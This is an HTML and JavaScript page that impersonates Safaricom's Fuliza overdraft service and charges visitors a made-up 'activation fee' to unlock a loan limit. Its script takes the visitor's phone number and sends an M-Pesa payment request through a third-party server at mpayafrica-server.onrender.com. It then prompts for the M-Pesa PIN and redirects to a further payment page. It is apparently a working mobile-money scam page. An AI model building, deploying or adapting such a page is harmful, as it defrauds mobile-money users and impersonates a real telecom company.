<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Your Fuliza Limit</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
.info{margin:10px 0;font-size:16px;}
input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
.pay-btn:hover{background:#179937;}
.spinner{margin-top:15px;display:none;}
.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
.message{margin-top:15px;font-size:14px;}
.encourage{margin-top:20px;font-size:14px;color:#555;}
</style>
</head>
<body>

<header class="top-bar">Safaricom Fuliza Activation</header>

<div class="payment-box">
<h2>Activate Your Fuliza Limit Now</h2>

<p class="encourage">
Pay your activation fee today to unlock your desired Fuliza limit instantly. Your financial freedom is just one click away!
</p>

<div class="info">Selected Limit: <strong id="limit"></strong></div>
<div class="info">Activation Fee: <strong id="fee"></strong></div>

<input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">

<button class="pay-btn" onclick="payNow()">Pay Activation Fee Now</button>

<div class="spinner" id="spinner"><div class="loader"></div></div>
<div class="message" id="message"></div>
</div>

<script>
const selectedAmount = localStorage.getItem("selectedAmount");
const activationFee = localStorage.getItem("activationFee");
document.getElementById("limit").innerText = "KSh " + selectedAmount;
document.getElementById("fee").innerText = "KSh " + activationFee;

function isSafaricom(number){
  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
}

function formatPhone(number){
  if(number.startsWith("07") || number.startsWith("01")){
    return "254" + number.substring(1);
  }
  return number;
}

async function payNow(){
  const phone = document.getElementById("phone").value.trim();
  const msg = document.getElementById("message");
  const spinner = document.getElementById("spinner");

  if(!phone){ msg.innerText="Enter your phone number"; msg.style.color="red"; return; }
  if(!isSafaricom(phone)){ msg.innerText="Only Safaricom numbers allowed"; msg.style.color="red"; return; }

  const phoneToSend = formatPhone(phone);
  spinner.style.display="block";
  msg.innerText="Initiating payment... please check your phone.";
  msg.style.color="black";

  try{
    const res = await fetch("https://mpayafrica-server.onrender.com/pay",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        phone: phoneToSend,
        amount: Number(activationFee)
      })
    });

    const data = await res.json();
    spinner.style.display="none";

    if(data.data && data.data.CheckoutRequestID){
      const reference = data.data.CheckoutRequestID;
      msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to confirm...";
      msg.style.color="green";
      checkPayment(reference, "payment2.html");
    } else {
      msg.innerText="Payment failed: "+(data.error || "Please try again");
      msg.style.color="red";
    }
  } catch(err){
    spinner.style.display="none";
    msg.innerText="Server error: "+(err.message || "Try again");
    msg.style.color="red";
  }
}

async function checkPayment(reference, nextPage){
  const msg = document.getElementById("message");
  let attempts=0;
  const interval = setInterval(async ()=>{
    attempts++;
    if(attempts>20){ clearInterval(interval); msg.innerText="Payment timeout. Please retry."; msg.style.color="red"; return; }
    try{
      const res = await fetch("https://mpayafrica-server.onrender.com/receipt/"+reference);
      const data = await res.json();
      if(data.success && data.receipt){
        const status = data.receipt.status.toLowerCase();
        if(status==="completed" || status==="processing" || status==="loan_released"){
          clearInterval(interval);
          msg.innerText="Payment successful ✅ Redirecting...";
          msg.style.color="green";
          setTimeout(()=>{window.location.href=nextPage},2000);
        }
        if(status==="cancelled" || status==="stk_failed" || status==="error"){
          clearInterval(interval);
          msg.innerText="Payment failed: "+(data.receipt.status_note || status);
          msg.style.color="red";
        }
      }
    }catch(e){}
  },3000);
}
</script>

</body>
</html>
